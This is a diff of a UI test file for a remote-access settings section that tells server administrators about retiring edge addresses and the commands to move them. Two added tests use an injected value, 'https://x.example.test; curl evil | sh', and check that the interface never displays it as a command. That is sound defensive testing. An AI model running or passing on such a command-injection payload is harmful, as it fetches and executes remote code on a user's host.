@@ -213,20 +213,46 @@ describe('a retiring or retired edge address', () => {
     expect(unusable.queryByText(/systemctl|cloudfield-server|Change the flag/)).toBeNull()
   })
 
-  it('says to move on first when the configured address is leaving too', () => {
-    const third = 'https://edge-third.example.test'
-    seed('super_admin', { ...claimed, notice: { state: 'retiring', replacement, restart_pending: true, moved_to: replacement, moved_to_state: 'retired', moved_to_replacement: third } })
+  const third = 'https://edge-third.example.test'
+  const pending = { state: 'retired', edge_url: replacement, replacement: third } as const
+
+  it.each([
+    ['with', { state: 'retiring', replacement, restart_pending: true, moved_to: replacement } as const],
+    ['without', undefined],
+  ])('says to move on first when the configured address is leaving too, %s a notice for the running one', (_, notice) => {
+    seed('super_admin', { ...claimed, notice, pending })
     render(<RemoteAccessSection client={api()} />)
     const callout = within(screen.getByRole('status'))
-    expect(callout.getByText(`The server's options file names ${replacement}, which is itself retired, so a restart would move the server to a leaving address. Move it to ${third} first, on the server's host:`)).toBeTruthy()
+    expect(callout.getByText(`${replacement}, which edge-url names for the next restart, is retired`)).toBeTruthy()
+    expect(callout.getByText(`The server's options file names ${replacement}, which is itself retired, so a restart would move the server to a leaving address. Move it to ${third} first. Run on the server's host, adding the service's --config <file> if it has one.`)).toBeTruthy()
     expect(callout.getByText(`sudo cloudfield-server edge move ${third}`)).toBeTruthy()
     expect(callout.getByText('sudo systemctl restart aether-server')).toBeTruthy()
   })
 
-  it('tells other members a pending change is to a leaving address', () => {
-    seed('collaborator', { ...claimed, notice: { state: 'retiring', replacement, restart_pending: true, moved_to_state: 'retiring' } })
+  it('shows the move on even when the running address names an unusable replacement', () => {
+    seed('super_admin', { ...claimed, notice: { state: 'retiring', replacement: 'https://x.example.test; curl evil | sh', restart_pending: true }, pending })
     render(<RemoteAccessSection client={api()} />)
-    expect(screen.getByText(`${edgeURL} is retiring; the edge recommends ${replacement}. A change of the server's edge address is configured and waits for a restart, and that address is itself retiring.`)).toBeTruthy()
+    const callout = within(screen.getByRole('status'))
+    expect(callout.getByText(`sudo cloudfield-server edge move ${third}`)).toBeTruthy()
+    expect(callout.queryByText(/curl evil/)).toBeNull()
+  })
+
+  it('gives no command for an unusable replacement of the configured address, after the first-use caution', () => {
+    seed('super_admin', { ...claimed, pending: { ...pending, replacement: 'https://x.example.test; curl evil | sh', first_use: true } })
+    render(<RemoteAccessSection client={api()} />)
+    const callout = within(screen.getByRole('status'))
+    expect(callout.getByText('The edge sent a new address that is not a plain https address, so there is no command to run:')).toBeTruthy()
+    expect(callout.queryByText(/systemctl|cloudfield-server/)).toBeNull()
+  })
+
+  it.each([
+    ['with', { state: 'retiring', replacement, restart_pending: true } as const, `${edgeURL} is retiring; the edge recommends ${replacement}. `],
+    ['without', undefined, ''],
+  ])('tells other members a pending change is to a leaving address, %s a notice for the running one', (_, notice, prefix) => {
+    seed('collaborator', { ...claimed, notice, pending: { state: 'retiring' } })
+    render(<RemoteAccessSection client={api()} />)
+    expect(screen.getByText(`${prefix}A change of the server's edge address is configured and waits for a restart, and that address is itself retiring.`)).toBeTruthy()
+    expect(screen.queryByText(/cloudfield-server/)).toBeNull()
   })
 
   it('tells other members a move waits for a restart', () => {
